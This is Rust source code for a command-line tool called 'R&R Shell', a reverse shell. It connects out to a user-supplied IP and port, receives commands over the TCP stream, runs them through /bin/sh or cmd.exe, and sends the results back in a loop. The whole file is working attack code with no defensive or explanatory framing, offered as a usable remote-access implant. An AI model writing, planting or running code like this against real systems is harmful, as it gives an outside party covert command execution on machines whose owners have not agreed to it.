extern crate clap;
use clap::{App, Arg};

use std::io::{Read, Write};
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;
use std::{env, net::TcpStream};

fn main() {
    let matches = App::new("R&R Shell")
        .version("1.0")
        .arg(
            Arg::with_name("ip")
                .short("i")
                .help("IP address of host to connect back to.")
                .required(true)
                .takes_value(true),
        )
        .arg(
            Arg::with_name("port")
                .short("p")
                .help("Port on host to connect to.")
                .required(true)
                .takes_value(true),
        )
        .get_matches();

    let port = matches.value_of("port").unwrap();
    let host = matches.value_of("ip").unwrap();

    println!("[*] Creating connection to {host}:{port}");
    let stream = TcpStream::connect(format!("{}:{}", host, port));

    match stream {
        Ok(mut succ) => {
            println!("[*] Connection successful.");
            command_exec_listener(&mut succ);
        }
        Err(e) => {
            println!("[*] Failed to create connection with error {e}");
        }
    }
}

fn get_os_fam() -> Vec<String> {
    match env::consts::FAMILY {
        "unix" => vec!["/bin/sh".to_string(), "-c".to_string()],
        "windows" => vec!["cmd.exe".to_string(), "/C".to_string()],
        _ => panic!("random argument in OS match"),
    }
}

fn command_exec_listener(stream: &mut TcpStream) -> ! {
    let cmd = get_os_fam();
    let mut buf = String::new();

    loop {
        let size = stream.read_to_string(&mut buf);
        println!("Read {:?}", buf);
        match size {
            Err(e) => match write!(stream, "Failure to read from stream with error {e}") {
                Ok(_) => println!("Successfully wrote to stream"),
                Err(e) => println!("Failed to write to stream with error {e}"),
            },
            Ok(_) => {
                println!("Executing: {}", buf);
                let resp = Command::new(&cmd[0])
                    .arg(&cmd[1])
                    .arg(&buf)
                    .output()
                    .expect("failed to exec command");
                println!("result: {resp:?}");
                match write!(stream, "{:?}", resp) {
                    Ok(_) => println!("Successfully returned result for command"),
                    Err(e) => println!("Failed to return result for command with error {e}"),
                }
            }
        }
        sleep(Duration::new(5, 0));
        buf.clear();
    }
}
